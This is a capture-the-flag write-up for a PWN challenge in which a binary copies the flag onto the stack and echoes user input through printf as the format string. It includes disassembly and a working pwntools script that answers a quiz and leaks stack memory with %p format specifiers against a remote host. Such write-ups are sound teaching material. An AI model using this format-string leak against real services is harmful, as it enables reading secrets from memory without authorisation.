# ege

Category: PWN
Points: ~920 
Solves: 16

Challenge Description:
another russian test i couldn't understand

Artifact Files:
[chall](./chall)

## Quick overview

This challenge asks us for a bunch of different questions in an "exam type"
with a bunch of different answers. 

Now i don't know russian so I just reversed it to find the correct answers :P

After passing this, we get to write something that seems to get printed back at us
before saying we failed the exam.

## The code

Now another interesting thing to take in account here is that the flag is loaded
on the stack at the start of the code:

```asm
│           0x000013c4      488d053d0c..   lea rax, str.FLAG           ; 0x2008 ; "FLAG"
│           0x000013cb      4889c7         mov rdi, rax                ; const char *name
│           0x000013ce      e87dfdffff     call sym.imp.getenv         ; char *getenv(const char *name)
│           0x000013d3      4889c2         mov rdx, rax
│           0x000013d6      488d45c0       lea rax, [dest]
│           0x000013da      4889d6         mov rsi, rdx                ; const char *src
│           0x000013dd      4889c7         mov rdi, rax                ; char *dest
│           0x000013e0      e87bfdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
```

And the second interesting part is... Well the print back of our input is through
the printf function AAAAND as format. This is a typical format string read on the stack...

```asm
│           0x000014dd      488d4590       lea rax, [format]
│           0x000014e1      be30000000     mov esi, 0x30               ; '0' ; int size
│           0x000014e6      4889c7         mov rdi, rax                ; char *s
│           0x000014e9      e8d2fcffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)

; ........ and later ..........

│           0x00001599      488d4590       lea rax, [format]
│           0x0000159d      4889c7         mov rdi, rax                ; const char *format
│           0x000015a0      b800000000     mov eax, 0
│           0x000015a5      e8f6fbffff     call sym.imp.printf         ; int printf(const char *format)
```

Meaning we can leak the flag from the stack by just dumping the hex memory.
We can use the `%p` format to print out the stack as a bunch of hex pointer addresses.

### Exploitation

Here is the exploit I used for this : 

```py
#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('./chall')

if args.REMOTE:
    io = remote("84.201.137.163", 10293)
else:
    io = process()

ans = [4, 2, 5, 2, 4, 1]
for a in ans:
    io.sendlineafter(b'>> ', str(a).encode())

io.sendline(b'%16$p-%17$p-%18$p-%19$p-%20$p-%21$p')
io.interactive()
io.close()
```

as you can see this just answers the questions and dumps a bunch of hex memory
from the stack. We can then take whatever got printed out and put in cyberchef

Apply the following filters:
- From hex
- Switch endianness (n=8)

And we get the flag.

[Back to home](../../README.md)
